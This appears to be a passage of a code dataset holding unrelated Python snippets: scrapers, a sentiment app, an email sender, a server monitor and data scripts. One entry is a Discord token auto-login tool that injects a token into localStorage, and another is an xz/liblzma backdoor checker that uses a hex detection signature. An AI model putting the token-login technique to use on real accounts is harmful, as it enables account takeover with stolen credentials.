_descriptor_pool.Default().AddSerializedFile(b'\\nPmediapipe/calculators/image/opencv_encoded_image_to_image_frame_calculator.proto\\x12\\tmediapipe\\x1a$mediapipe/framework/calculator.proto\\\"\\xcd\\x01\\n/OpenCvEncodedImageToImageFrameCalculatorOptions\\x12/\\n apply_orientation_from_exif_data\\x18\\x01 \\x01(\\x08:\\x05\\x66\\x61lse2i\\n\\x03\\x65xt\\x12\\x1c.mediapipe.CalculatorOptions\\x18\\x8c\\xfa\\xd8\\x90\\x01 \\x01(\\x0b\\x32:.mediapipe.OpenCvEncodedImageToImageFrameCalculatorOptions')\n\n_globals = globals()\n_builder.BuildMessageAndEnumDescriptors(DESCRIPTOR, _globals)\n_builder.BuildTopDescriptorsAndMessages(DESCRIPTOR, 'mediapipe.calculators.image.opencv_encoded_image_to_image_frame_calculator_pb2', _globals)\nif _descriptor._USE_C_DESCRIPTORS == False:\n  mediapipe_dot_framework_dot_calculator__options__pb2.CalculatorOptions.RegisterExtension(_OPENCVENCODEDIMAGETOIMAGEFRAMECALCULATOROPTIONS.extensions_by_name['ext'])\n\n  DESCRIPTOR._options = None\n  _globals['_OPENCVENCODEDIMAGETOIMAGEFRAMECALCULATOROPTIONS']._serialized_start=134\n  _globals['_OPENCVENCODEDIMAGETOIMAGEFRAMECALCULATOROPTIONS']._serialized_end=339\n# @@protoc_insertion_point(module_scope)\n",
    "import streamlit as st\r\nimport assemblyai as ai\r\nimport matplotlib.pyplot as plt\r\nfrom wordcloud import WordCloud\r\n\r\nai.settings.api_key = \"API_KEY\"\r\n\r\nst.title(\"Customer Satisfaction from Audio Recording\")\r\n\r\nuploaded_file = st.file_uploader(\"Upload an audio file\", type=[\"mp3\",\"wav\"])\r\n\r\nif uploaded_file is not None:\r\n    audio_url = \"./temp_audio.mp3\" \r\n    with open(audio_url, \"wb\") as f:\r\n        f.write(uploaded_file.read())\r\n\r\n    config = ai.TranscriptionConfig(sentiment_analysis=True, auto_highlights=True)\r\n    transcript = ai.Transcriber().transcribe(audio_url, config)\r\n\r\n    positive_count = 1\r\n    neutral_count = 1\r\n    negative_count = 1\r\n\r\n    positive_score = 0\r\n    neutral_score = 0\r\n    negative_score = 0\r\n\r\n    for sentiment_result in transcript.sentiment_analysis:\r\n        if sentiment_result.sentiment == ai.SentimentType.positive:\r\n            positive_count += 1\r\n            positive_score += sentiment_result.confidence\r\n        elif sentiment_result.sentiment == ai.SentimentType.neutral:\r\n            neutral_count += 1\r\n            neutral_score += sentiment_result.confidence\r\n        else:\r\n            negative_count += 1\r\n            negative_score += sentiment_result.confidence\r\n\r\n    if positive_count > neutral_count and positive_count > negative_count:\r\n        sentiment = \"Positive\"\r\n        resultScore = positive_score / positive_count\r\n    elif negative_count > neutral_count and negative_count > positive_count:\r\n        sentiment = \"Negative\"\r\n        resultScore = negative_score / negative_count\r\n    else:\r\n        sentiment = \"Neutral\"\r\n        resultScore = neutral_score / neutral_count\r\n\r\n    st.subheader(\"Sentiment Analysis:\")\r\n    st.write(f\"Sentiment: {sentiment}\")\r\n    st.write(f\"Confidence Score: {resultScore:.2f}\")\r\n\r\n\r\n    st.subheader(\"Word Cloud of Highlighted Words:\")\r\n    highlights = []\r\n    for result in transcript.auto_highlights.results:\r\n        highlights.append(result.text)\r\n\r\n    highlighted_text = \" \".join(highlights)\r\n    wordcloud = WordCloud(width=800, height=400, background_color='white').generate(highlighted_text)\r\n    plt.figure(figsize=(10, 5))\r\n    plt.imshow(wordcloud, interpolation='bilinear')\r\n    plt.axis(\"off\")\r\n    st.pyplot(plt)\r\n",
    "import requests\nfrom bs4 import BeautifulSoup\nimport rumps\n\ndef get_live_scores():\n   \n    url = \"https://www.cricbuzz.com/\"\n\n    response = requests.get(url)\n    soup = BeautifulSoup(response.text, 'html.parser')\n    score_elements = soup.find_all(\"div\", class_=\"cb-ovr-flo\")\n\n    team1 = score_elements[1].text.strip()  \n    score1 = score_elements[2].text.strip() \n    team2 = score_elements[3].text.strip()  \n    score2 = score_elements[4].text.strip()  \n    match_status = score_elements[5].text.strip() \n\n    return team1, score1, team2, score2, match_status\n\nclass LiveCricketScoresApp(rumps.App):\n    def __init__(self):\n        super(LiveCricketScoresApp, self).__init__(\"Live Cricket Scores\")\n        self.menu = [\"Refresh\", rumps.separator]\n        self.refresh_scores()  \n        rumps.timer(30)(self.refresh_scores)  \n\n    @rumps.clicked(\"Refresh\")\n    def refresh_scores(self, _=None):\n        team1, score1, team2, score2, match_status = get_live_scores()\n        self.title = f\"{team1}: {score1} vs {team2}: {score2} ({match_status})\"\n\nif __name__ == '__main__':\n    LiveCricketScoresApp().run()\n",
    "import scrapy \nfrom datetime import datetime\nfrom linkedin_job.items import JobItem\n\nfile_postfix = datetime.now().strftime('%Y%m%d')\n\nclass linkedin_job(scrapy.Spider):\n    name = 'linkedin_job'\n    custom_settings = {'FEEDS' : { f'job_data_{file_postfix}.csv': { 'format': 'csv'}}}\n    \n    url = 'https://www.linkedin.com/jobs/search/?currentJobId=3836773060&geoId=104195383&keywords=data%20engineer&location=Vietnam&origin=JOB_SEARCH_PAGE_SEARCH_BUTTON&refresh=true&start='\n    \n    def start_requests(self):\n       job_on_page = 0\n       start_url = self.url + str(job_on_page)\n       yield scrapy.Request(url = start_url, callback=self.parse, meta={'job_on_page': job_on_page})\n\n    def parse(self, response):\n        job_on_page = response.meta['job_on_page']\n\n        jobs = response.css('li')\n\n        job_num = len(jobs)\n\n        for job in jobs:\n            job_item = JobItem()\n            \n            job_item['job_url'] = job.css('a::attr(href))').get(default='not-found').strip()\n            \n            yield job_item\n\n        if job_num > 0:\n            job_on_page = int(job_on_page) + 25\n            next_url = self.url + str(job_on_page)\n            \n            yield scrapy.Request(url = next_url, callback= self.parse, meta={'job_on_page': job_on_page}) ",
    "import smtplib\nimport ssl\nfrom email.mime.text import MIMEText\nfrom email.mime.multipart import MIMEMultipart\n\n# Sender and receiver email addresses\nsender = [\"myemail@gmail.com\", \"aaaa bbbb cccc dddd\"]\nreceiver_email = \"receiver_email\"\n\n# Function to send email\ndef sendEmail(to, sender_email, password):\n    # Create a multipart message\n    message = MIMEMultipart(\"alternative\")\n    message[\"Subject\"] = \"Write Your Subject Here\"\n    message[\"From\"] = \"Name of the sender\"\n    message[\"To\"] = to\n    message[\"Importance\"] = \"high\"  # Set the importance level\n\n    # HTML content of the email\n    html = \"\"\"\n        <!DOCTYPE html>\n        <html lang=\"en\">\n        <head>\n            <meta charset=\"UTF-8\">\n            <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n            <title>Email Sample</title>\n        </head>\n        <body>\n            <div>\n                <h1>Hello</h1>\n                <h3>how are you?</h3>\n            </div>\n        </body>\n        </html>\"\"\"\n        \n    # Create a MIMEText object with the HTML content\n    part2 = MIMEText(html, \"html\")\n    message.attach(part2)\n\n    # Create a secure SSL context\n    context = ssl.create_default_context()\n\n    # Connect to the SMTP server and send the email\n    with smtplib.SMTP_SSL(\"smtp.gmail.com\", 465, context=context) as server:\n        try:\n            # Login to the server using the sender's email and password\n            server.login(sender_email, password)\n            \n            # Send the email\n            server.sendmail(sender_email, to, message.as_string())\n            \n            # Print a success message\n            print(f\"Email sent successfully to {to}\")\n        except smtplib.SMTPAuthenticationError as e:\n            # Handle authentication errors\n            print(f\"SMTP Authentication Error: {e}\")\n            print(\"Check username, password, and 'Less Secure Apps' access.\")\n        except Exception as e:\n            # Handle other exceptions\n            print(f\"An error occurred: {e}\")\n\n# Call the sendEmail function with the receiver email, sender's email, and password\nsendEmail(receiver_email, sender[0], sender[1])\n\n# Copyright information\n\"\"\"\nAuthor: KHAOUITI ABDELHAKIM\nGitHub: @khaouitiabdelhakim\n\"\"\" \n",
    "##### PyMonG\n##### (c) 2024 Giovambattista Vieri All Rigths Reserved\n##### License Affero GPL. \n\n\n\n# free -m \n# vmstat \n# df \n# lscpu \n# mpstat\n# iostat\n\n# nstat\n# ss\n# netstat -1\n# ip -s link\n# arpwatch\n##############\n\nimport sys\nimport gnupg\nimport base64\nimport pprint\n\n\ncommands=[\"free -m\",\n#          \"vmstat\",\n#          \"lscpu\",\n#          \"mpstat\",\n#          \"iostat\",\n#          \"nstat\",\n#          \"ss\",\n#          \"netstat -l\",\n#          \"ip -s link\",\n#          \"arpwatch\",\n          \"df -k\"]\n\n\nimport os \nimport subprocess\nimport argparse\n\n\ndefaultkey='testgpg@example.com'\n\ndef getOptions(args=sys.argv[1:]):\n    parser=argparse.ArgumentParser(description='This simple program will help you to write an encrypted monitor about a server status. The resulting string is printed on stdout and can be sent via mqtt or smtp, etc..',epilog='Example of use:')\n    parser.add_argument('-v','--verbose', help='more verbose output', action='store_true')\n    parser.add_argument('-a','--archive', help='archive report in files in ~./repo_path ', action='store_true')\n    parser.add_argument('-k','--key', help='choose gpg key to use', default=defaultkey, action='store_true')\n    opt=parser.parse_args(args)\n    return(opt)\n\nopt=getOptions()\nverbose=opt.verbose\narchive=opt.archive\nenc_key=opt.key\n\nres=\"\"\nfor c in commands:\n    r=subprocess.check_output(c,shell=True)\n    res=res+\"---\"+c+\"---\\n\"+r.decode(\"ascii\")\n\n###########\n### print(res)\n##########\n\n\n\n\nrecipient_key=[enc_key]\npath= os.getcwd()\ngpg=gnupg.GPG(gnupghome=path+'/.gnupg')\npublic_keys = gpg.list_keys() \n\nif (verbose):\n    for pk in public_keys:\n        print(pk['uids'])\n    print (\"--------------------------\")\n\nif(archive):\n    file_path=\"/prova1.txt\"\n    repo_path=\"./repo_path\"\n    if not os.path.exists(repo_path):\n        os.makedirs(repo_path)\n\n    file=\".\"+file_path\n    print(\"--------------\",file)\n\n    output_path=repo_path+file_path\n    print(\"--------------\",output_path)\n\ntry:\n###    status = gpg.encrypt_file(\n####        file_data,\n###        res,\n###        recipients=recipient_key,\n###        output=output_path + '.pgp',\n###        always_trust = True\n###    )\n    encrypted_ascii_data= gpg.encrypt(res,\n        recipients=recipient_key,\n        always_trust = True\n    )\nexcept Exception as e:\n    print (\"---- exception ----\")\n    print (e)\n\nprint (encrypted_ascii_data)\n",
    "import pandas as pd\nimport plotly.express as px\n\ncaminho_arquivo = r\"C:\\Users\\Vitor Cardoso\\Desktop\\GitHub_Training\\Alura_Imersao_Python\\spreadsheet\\acoes pura.xlsx\"\n\n# Importing spreadsheet data into the Data Frame (DF) variable\n\ndf_principal = pd.read_excel(caminho_arquivo, sheet_name=\"Principal\")\nprint(\"\\nImportando dados da aba \\\"Principal\\\" da planilha \\\"acoes pura\\\".\")\n#print(df_principal.head(10))\n\ndf_total_acoes = pd.read_excel(caminho_arquivo, sheet_name=\"Total_de_acoes\")\nprint(\"\\nImportando dados da aba \\\"Total_de_acoes\\\" da planilha \\\"acoes pura\\\".\")\n#print(df_total_acoes.head(10))\n\ndf_ticker = pd.read_excel(caminho_arquivo, sheet_name=\"Ticker\")\nprint(\"\\nImportando dados da aba \\\"Ticker\\\" da planilha \\\"acoes pura\\\".\")\n#print(df_ticker.head(10))\n\ndf_chatgpt = pd.read_excel(caminho_arquivo, sheet_name=\"ChatGPT\")\nprint(\"\\nImportando dados da aba \\\"ChatGPT\\\" da planilha \\\"acoes pura\\\".\")\n#print(df_chatgpt.head(10))\n\n# filtering columns from \"Principal\" dataframe\ndf_principal = df_principal[[\"Ativo\", \"Data\", \"\u00daltimo (R$)\", \"Var. Dia (%)\"]].copy()\nprint(\"\\nFiltrando colunas do dataframe \\\"Principal\\\".\")\n#print(df_principal)\n\n# Renaming columns to make names more Python-friendly\ndf_principal = df_principal.rename(columns={'\u00daltimo (R$)':'valor_final','Var. Dia (%)':'var_dia_pct'}).copy()\nprint(\"\\nRenomeando colunas para deixar nomes mais amig\u00e1veis ao python.\")\n#print(df_principal)\n\n# Creating new columns for analysis - \"Var_pct\" and \"Var_inicial\"\ndf_principal['Var_pct'] = df_principal['var_dia_pct']/100\ndf_principal['Var_inicial'] = df_principal['valor_final']/(df_principal['Var_pct']+1)\nprint(\"\\nCriando novas colunas para analise - \\\"Var_pct\\\" e \\\"Var_inicial\\\".\")\n#print(df_principal)\n\n# Merge between df_principal and df_total_acoes - Codigo\ndf_principal = df_principal.merge(df_total_acoes, left_on='Ativo', right_on='C\u00f3digo',how='left')\nprint(\"\\nMerge entre df_principal e df_total_acoes - Codigo.\")\n#print(df_principal)\n\n# Removing duplicate column - codigo\ndf_principal = df_principal.drop(columns=['C\u00f3digo'])\nprint(\"\\nRemovendo coluna duplicada - codigo.\")\n#print(df_principal)\n\n# Creating new analysis column - VARIACAO_RS\ndf_principal['variacao_rs'] = (df_principal['valor_final'] - df_principal['Var_inicial'])*df_principal['Qtde. Te\u00f3rica']\nprint(\"\\nCriando nova coluna de analise - VARIACAO_RS.\")\n#print(df_principal)\n\n# Adjusting formatting for float type\npd.options.display.float_format = '{:.2f}'.format\nprint(\"\\nAjustando formata\u00e7\u00e3o para tipo float.\")\n#print(df_principal)\n\n# Adjusting formatting of the \"Qtde. Teorica\" column for int\ndf_principal['Qtde. Te\u00f3rica'] = df_principal['Qtde. Te\u00f3rica'].astype(int)\nprint(\"\\nAjustando formatacao da coluna \\\"Qtde. Teorica\\\" para int.\")\n#print(df_principal)\n\n# Adjusting the name of the \"Qtde. Teorica\" column \ndf_principal = df_principal.rename(columns={'Qtde. Te\u00f3rica':'Qtd_teorica'}).copy()\nprint(\"\\nAjustando o nome da coluna \\\"Qtde. Teorica\\\".\")\n#print(df_principal)\n\n# Logical validation with if + new column - check if the variation has gone up \"Subiu\" or down \"Desceu\"\ndf_principal['Resultado'] = df_principal['variacao_rs'].apply(lambda x: 'Subiu' if x > 0 else ('Desceu' if x < 0 else 'Estavel'))\nprint(\"\\nValida\u00e7\u00e3o l\u00f3gica com if + nova coluna - verificando se a varia\u00e7\u00e3o subiu ou desceu.\")\n#print(df_principal)\n\n# Merge with \"ativo\" vs \"nome da empresa\"\ndf_principal = df_principal.merge(df_ticker, left_on='Ativo', right_on='Ticker',how='left')\nprint(\"\\nMerge with \\\"ativo\\\" vs \\\"nome da empresa\\\".\")\n#print(df_principal)\n\n# Removing column 'Ticker'\ndf_principal = df_principal.drop(columns=['Ticker'])\nprint(\"\\nRemovendo coluna \\\"Ticker\\\".\")\n#print(df_principal)\n\n# Merge with 'nome' vs 'segmento'\ndf_principal = df_principal.merge(df_chatgpt, left_on='Nome', right_on='Nome da Empresa',how='left')\nprint(\"\\nMerge entre \\\"nome\\\" vs \\\"segmento\\\".\")\n#print(df_principal)\n\n# Removing column 'Nome da Empresa'\ndf_principal = df_principal.drop(columns=['Nome da Empresa'])\nprint(\"\\nRemovendo coluna \\\"Nome da Empresa\\\".\")\n#print(df_principal)\n\n# Renaming column 'Idade (em anos)'\ndf_principal = df_principal.rename(columns={'Idade (em anos)':'Idade'})\nprint(\"\\nRenomeando coluna \\\"Idade (Em anos)\\\".\")\n#print(df_principal)\n\n# Logical validation with if + new column - checking age of the company\ndf_principal['Cat_idade'] = df_principal['Idade'].apply(\n    lambda x: 'Mais de 100' \n    if x > 100 else ('Menos de 50' \n    if x < 50 else 'Entre 50 e 100'))\nprint(\"\\nValida\u00e7\u00e3o l\u00f3gica com if + nova coluna - Conferindo idade da empresa.\")\n#print(df_principal)\n\n#Data Analyse of 'df principal'\nprint(\"\\nAnalise dos dados:\")\n\n# calculating the max value\nmaior = df_principal['variacao_rs'].max()\n\n# calculating the min value\nmenor = df_principal['variacao_rs'].min()\n\n# calculating the mean value\nmedia = df_principal['variacao_rs'].mean()\n\n# calculating the average only of those who 'subiu'\nmedia_subiu = df_principal[df_principal['Resultado'] == 'Subiu']['variacao_rs'].mean()\n\n# calculating the average o",
    "import requests\r\nimport time\r\nfrom colorama import Fore\r\nfrom util.plugins.commun import *\r\n\r\ndef autologin() :\r\n    from selenium import webdriver\r\n    setTitle(\"Auto Login\")\r\n    clear()\r\n    autologintitle()\r\n    print(f\"{y}[{w}+{y}]{w} Enter the token of the account you want to connect to\")\r\n    entertoken = str(input(f\"{y}[{b}#{y}]{w} Token: \"))\r\n    validityTest = requests.get('https://discordapp.com/api/v6/users/@me', headers={'Authorization': entertoken, 'Content-Type': 'application/json'})\r\n    if validityTest.status_code != 200:\r\n        print(f\"\\n{y}[{Fore.LIGHTRED_EX }!{y}]{w} Invalid token\")\r\n        input(f\"\"\"\\n{y}[{b}#{y}]{w} Press ENTER to exit\"\"\")\r\n        main()\r\n    try:\r\n        driver = webdriver.Chrome(executable_path=r'util/chromedriver.exe')\r\n        driver.maximize_window()\r\n        driver.get('https://discord.com/login')\r\n        js = 'function login(token) {setInterval(() => {document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `\"${token}\"`}, 50);setTimeout(() => {location.reload();}, 500);}'\r\n        time.sleep(3)\r\n        driver.execute_script(js + f'login(\"{entertoken}\")')\r\n        time.sleep(10)\r\n        if driver.current_url == 'https://discord.com/login':\r\n            clear()\r\n            autologintitle()\r\n            print(f\"\"\"{y}[{Fore.LIGHTRED_EX }!{y}]{w} Connection Failed\"\"\")\r\n            driver.close()\r\n        else:\r\n            clear()\r\n            autologintitle()\r\n            print(f\"\"\"{y}[{Fore.LIGHTGREEN_EX }!{y}]{w} Connection Established\"\"\")\r\n        input(f\"\"\"{y}[{b}#{y}]{w} Press ENTER to exit\"\"\")\r\n        main()\r\n    except:\r\n        print(f\"      {y}[{Fore.LIGHTRED_EX }!{y}]{w} A problem occurred\")\r\n        time.sleep(2)\r\n        clear()\r\n        main()\r\n\r\nautologin()\r\n",
    "# -*- coding: utf-8 -*-\nimport pandas as pd\nimport time\nfrom IPython.display import display\nfrom seleniumwire.utils import decode\nfrom fb_graphql_scraper.base.base_page import *\nfrom fb_graphql_scraper.pages.page_optional import *\nfrom fb_graphql_scraper.utils.locator import *\nfrom fb_graphql_scraper.utils.utils import *\nfrom fb_graphql_scraper.utils.parser import RequestsParser\nfrom tqdm import tqdm, trange\n\n\nclass FacebookSettings:\n    def __init__(self,url,fb_account:str=None,pwd:str=None,driver_path:str=None):\n        super().__init__()\n        self.fb_account = fb_account\n        self.pwd = pwd\n        self.url=url\n        self.set_spider(driver_path=driver_path)\n        self.set_container()\n    \n    def set_spider(self, driver_path):\n        \"\"\">> Description: Auto login account or click \"X\" button to continue, \n        but some account can't not be display info if you don't login account\n        >> Args: url (_str_): target user which you want to collect data.\"\"\"\n        self.base_page = BasePage(driver_path=driver_path)\n        self.page_optional = PageOptional(\n            url_in=self.url, \n            driver=self.base_page.driver,\n            fb_account=self.fb_account,\n            pwd=self.pwd\n        )\n        time.sleep(5)\n        self.requests_parser = RequestsParser(driver=self.page_optional.driver)\n        \n    def set_container(self):\n        self.post_id_list = []\n        self.reaction_count_list = []\n        self.res = {\n            \"post_caption\": [],\n            \"post_date\": [],\n            \"post_likes\": [],\n            \"comment_share_type\": [],\n            \"comment_share_value\": []\n        }\n\n\nclass FacebookGraphqlScraper(FacebookSettings):\n    def __init__(self,url=\"https://www.facebook.com/\",fb_account:str=None, pwd:str=None,driver_path:str=None):\n        super().__init__(url=url, fb_account=fb_account, pwd=pwd,driver_path=driver_path)\n\n    def checking_page(self):\n        try:\n            self.page_optional.click_reject_login_button()\n            self.page_optional.scroll_window()\n        except Exception as e:\n            print(f\"Get in to page unsucessfully, quit driver.\\n error message: {e}\")\n            self.page_optional.quit_driver()\n\n    def move_to_next_kol(self, url:str):\n        self.page_optional.driver.get(url=url)\n\n    def pause(self):\n        time.sleep(1)\n\n    @classmethod\n    def get_user_posts(cls, fb_username_or_userid:str, loop_times:int=50, fb_account:str=None, pwd:str=None,driver_path:str=None):\n        url = \"https://www.facebook.com/\"+fb_username_or_userid\n        spider = cls(url=url,fb_account=fb_account,pwd=pwd,driver_path=driver_path)\n        # Scroll page\n        for round in tqdm(range(loop_times)): # \u6efe\u52d5\u6b21\u6578\n            spider.page_optional.scroll_window()\n            spider.pause()\n\n        # Collect data\n        driver_requests = spider.page_optional.driver.requests\n        for req in driver_requests:\n            req_response, req_url = req.response, req.url\n            body_out = spider.requests_parser.get_graphql_body_content(req_response=req_response, req_url=req_url)\n            if body_out:\n                spider.requests_parser.parse_body(body_content=body_out)\n\n        res_out = spider.requests_parser.collect_posts()\n        new_reactions = []\n\n        # Process data\n        for each_res in res_out:\n            each_reactions = each_res['top_reactions']['edges']\n            processed_reactions = spider.requests_parser.process_reactions(reactions_in=each_reactions)\n            new_reactions.append(processed_reactions)\n\n        final_res = pd.json_normalize(res_out)\n        final_res = final_res[[\n            'post_id', \n            'reaction_count.count',\n            'comment_rendering_instance.comments.total_count',\n            'share_count.count',\n            'top_reactions.edges',\n            'video_view_count'\n        ]]\n        \n        final_res['context'] = spider.requests_parser.context_list\n        final_res['time'] = spider.requests_parser.creation_list\n        final_res['username_or_userid'] = fb_username_or_userid\n        final_res['published_date']=pd.to_datetime(final_res['time'],unit='s')\n        final_res['sub_reactions'] = new_reactions\n        final_res['post_url'] = \"https://www.facebook.com/\"+final_res['post_id']\n        final_res['published_date2'] = final_res['published_date'].dt.strftime('%Y-%m-%d')\n        final_res = final_res[[\n            'post_id', \n            'post_url',\n            'username_or_userid',\n            'published_date',\n            'published_date2',\n            'time',\n            'reaction_count.count',\n            'comment_rendering_instance.comments.total_count',\n            'share_count.count',\n            'sub_reactions',\n            'context',\n            'video_view_count'\n        ]]\n        return final_res\n",
    "import subprocess\nfrom loguru import logger\n\n\nVERSAO_VULNERAVEL = [\"5.6.0\", \"5.6.1\"]\n\n\ndef verificar_caminho_sshd():\n    try:\n        caminho_sshd = subprocess.run([\n            \"whereis\",\n            \"-b\",\n            \"sshd\"],\n            capture_output=True\n        )\n        caminho_sshd = caminho_sshd.stdout\n        retorno = caminho_sshd.decode(\"utf-8\").replace(\"\\n\", \"\")\n        retorno = retorno.split()\n        logger.info(f\"Caminho verificado: {retorno}\")\n        return retorno[1]\n    except Exception as e:\n        logger.error(e)\n        return False\n\n\ndef verificar_liblzma(path_sshd):\n    try:\n        logger.info(f\"Verificando ldd: {path_sshd}\")\n        ldd_output = subprocess.run([\"ldd\", path_sshd], capture_output=True)\n        ldd_output = ldd_output.stdout\n        path_liblzma = ldd_output.decode(\"utf-8\").split()\n        retorno_lista = list(filter(lambda x: 'liblzma' in x, path_liblzma))\n        logger.info(f\"Lista: {retorno_lista}\")\n        return retorno_lista[1]\n    except Exception as e:\n        logger.error(e)\n        return False\n\n\ndef verificar_xz():\n    try:\n        caminho_xz = subprocess.run([\n            \"whereis\",\n            \"-b\",\n            \"xz\"],\n            capture_output=True\n        )\n        caminho_xz = caminho_xz.stdout\n        logger.info(caminho_xz)\n        retorno = caminho_xz.decode(\"utf-8\").replace(\"\\n\", \"\")\n        retorno = retorno.split()\n        logger.info(f\"Caminho verificado: {retorno}\")\n        return retorno[1]\n    except Exception as e:\n        logger.error(e)\n        return False\ndef conferir_assinatura(path):\n    hex_dump_liblzma = subprocess.run([\n        \"hexdump\",\n        \"-ve\",\n        '1/1 \\\"%02x\\\"',\n        path],\n        capture_output=True\n    )\n    hex_dump_liblzma = hex_dump_liblzma.stdout\n    if \"f30f1efa554889f54c89ce5389fb81e7000000804883ec28488954241848894c2410\" in hex_dump_liblzma.decode(\"utf-8\"):\n        logger.warning(\"Assinatura da liblzma: VULNERAVEL\")\n    else:\n        logger.success(\"Assinatura da liblzma: OK\")\n\ndef conferir_xz_versao():\n    versao_xz = subprocess.run([\n        \"xz\",\n        \"--version\"\n    ],\n    capture_output=True)\n    versao_xz = versao_xz.stdout\n    versao_local = versao_xz.decode(\"utf-8\").split()\n    if versao_local[1] in VERSAO_VULNERAVEL:\n        logger.warning(\"xz VULNERAVEL\")\n    else:\n        logger.success(\"xz OK\")\n\n\nif __name__ == \"__main__\":\n    logger.info(\"Inicializando CVE...\")\n    vh = verificar_caminho_sshd()\n    vl = verificar_liblzma(vh)\n    conferir_assinatura(vl)\n    vz = verificar_xz()\n    conferir_xz_versao()\n    logger.info(\"Encerrando CVE...\")",
    "from flask import Flask, request, render_template, jsonify\nimport requests\n\napp = Flask(__name__)\n\n# URLs for the APIs hosting your models\nvehicle_detection_api = \"http://your_vehicle_detection_api_endpoint\"\nanomaly_detection_api = \"http://your_anomaly_detection_api_endpoint\"\nnumber_plate_detection_api = \"http://your_number_plate_detection_api_endpoint\"\n\n\n@app.route('/')\ndef home():\n    return render_template('index.html')\n\n\n@app.route('/process_video', methods=['POST'])\ndef process_video():\n    # Get the uploaded video file and car color\n    video_file = request.files['video']\n    color = request.form['color']\n\n    # Send the video file to vehicle detection model API\n    video_bytes = video_file.read()\n    vehicle_detection_response = requests.post(vehicle_detection_api, files={'video': video_bytes})\n    vehicle_detections = vehicle_detection_response.json()\n\n    # Send the video file to anomaly detection model API\n    anomaly_detection_response = requests.post(anomaly_detection_api, files={'video': video_bytes})\n    anomaly_frames = anomaly_detection_response.json()\n\n    # Process the frames to detect car color\n    # Your code for processing frames and filtering cars of specified color goes here\n\n    # Process only the frames with cars of specified color\n    color_filtered_frames = []\n    for frame in anomaly_frames:\n    # Your code to filter cars of specified color and store the frames\n\n    # Initialize list to store number plate detections\n    number_plate_detections = []\n\n    # Send each filtered frame to number plate detection model API\n    for frame in color_filtered_frames:\n        response = requests.post(number_plate_detection_api, files={'frame': frame})\n        number_plate_detections.append(response.json())\n\n    # Render the result template with the processed results\n    return render_template('result.html', number_plate_detections=number_plate_detections)\n\n\nif __name__ == '__main__':\n    app.run(debug=True)\n",
    "from faker import Faker\nimport os\nimport random\n\nplacas = list()\n\ndef gerar_clientes():    \n    faker = Faker(\"PT-BR\")    \n    for i in range(0, 10000):\n        nome = faker.name()\n        cpf = faker.cpf()\n        with open('clientes.sql', 'a') as file:\n            file.write(f\"INSERT INTO Cliente(CliId, Nome, CPF) VALUES ('{i}', '{nome}', '{cpf}');\\n\")\n\n\ndef gerar_zonas():\n    faker = Faker(\"PT-BR\")\n    for i in range(0, 12164):\n        with open('zonas.sql', 'a') as file:\n            file.write(f\"INSERT INTO Zona(Zona) VALUES ('{faker.city()}');\\n\")\n            \n\ndef gerar_taxis():\n    faker = Faker(\"PT-BR\")\n    for i in range(0, 13826):\n        placa = faker.license_plate()\n        placas.append(placa)\n        marca = faker.company()\n        modelo = faker.word().capitalize()\n        ano_fab = faker.random_int(min=1990, max=2023)\n        licenca = faker.random_element(elements=('A', 'B', 'C')) + str(faker.random_number(digits=6))\n\n        with open('taxis.sql', 'a') as file:\n            file.write(f\"INSERT INTO Taxi(Placa, Marca, Modelo, AnoFab, Licenca) VALUES ('{placa}', '{marca}', '{modelo}', {ano_fab}, '{licenca}');\\n\")\n            \n            \ndef gerar_empresas():    \n    faker = Faker(\"PT-BR\")\n    fake_empresa = Faker(\"EN-US\")\n    for i in range(0, 10000):\n        nome = fake_empresa.word().capitalize()\n        cnpj = faker.cnpj()\n        with open('empresas.sql', 'a') as file:\n            file.write(f\"INSERT INTO ClienteEmpresa(CliId, Nome, CNPJ) VALUES ('{i}', '{nome}', '{cnpj}');\\n\")\n\n\ndef gerar_motoristas():    \n    faker = Faker(\"PT-BR\")\n    for i in range(0, 11253):\n        cnh = faker.random_number(digits=11)\n        nome = faker.name()\n        validade = faker.random_number(digits=8)\n        placa = random.choice(placas)\n        with open('motoristas.sql', 'a') as file:\n            file.write(f\"INSERT INTO Motorista(CNH, Nome, CNHValid, Placa) VALUES ('{cnh}', '{nome}', {validade}, '{placa}');\\n\")\n            \n\ndef gerar_corridas():    \n    faker = Faker(\"PT-BR\")\n    for i in range(0, 16384):\n        id_cliente = random.randint(1, 10000)\n        placa = random.choice(placas)\n        data = faker.date()\n        with open('corridas.sql', 'a') as file:\n            file.write(f\"INSERT INTO Corrida(CliId, Placa, DataPedido) VALUES ('{id_cliente}', '{placa}', {data});\\n\")\n            \n            \n            \nif __name__ == '__main__':    \n    try:\n        os.remove('clientes.sql')\n        os.remove('taxis.sql')\n        os.remove('zonas.sql')\n        os.remove('empresas.sql')\n        os.remove('motoristas.sql')\n        os.remove('corridas.sql')\n    except:\n        pass\n    gerar_clientes()\n    gerar_zonas()\n    gerar_taxis()\n    gerar_empresas()\n    gerar_motoristas()\n    gerar_corridas()\n    ",
    "\r\n\"\"\"\r\nCreated By *Abdullah EL-Yamany*\r\n-------------------------------\r\n\"\"\"\r\n\r\nfrom selenium import webdriver\r\nfrom selenium.webdriver.common.by import By\r\nimport time, urllib.request\r\n\r\n\r\ndriver = webdriver.Chrome()\r\ndriver.get(\"https://www.instagram.com/\")\r\n\r\ntime.sleep(2)\r\n\r\n# -------- Login ------- #\r\nwhile True:\r\n    try:\r\n        username = driver.find_element(By.CSS_SELECTOR, 'input[name=\"username\"]')\r\n        password = driver.find_element(By.CSS_SELECTOR, 'input[name=\"password\"]')\r\n        break\r\n    except:\r\n        time.sleep(3)\r\n\r\nusername.clear()\r\npassword.clear()\r\nusername.send_keys(\"xxxxxxxxxxx\") # Write Email or Phone\r\npassword.send_keys(\"xxxxxxxxxxx\") # Write Password\r\n\r\ntime.sleep(1)\r\nlogin = driver.find_element(By.CSS_SELECTOR, 'button[type=\"submit\"]').click()\r\n\r\n#save your login info?\r\nwhile True:\r\n    time.sleep(5)\r\n    try:\r\n        notnow = driver.find_element(By.XPATH, '//div[@class=\"_ac8f\"]/div[@role=\"button\"]').click()\r\n        break\r\n    except:\r\n        continue\r\n\r\n\r\n#turn on notif\r\ntime.sleep(2)\r\nnotnow2 = driver.find_element(By.XPATH, \"//button[contains(text(), 'Not Now')]\").click()\r\n\r\n# post\r\npost_link = \"https://www.instagram.com/p/xxxxxxxxxxxxxxxxxxxxxxxx\" # Write Link Of Post\r\n\r\n\r\n#get videos and images\r\ndownload_url = ''\r\n\r\ndriver.get(post_link)\r\nshortcode = 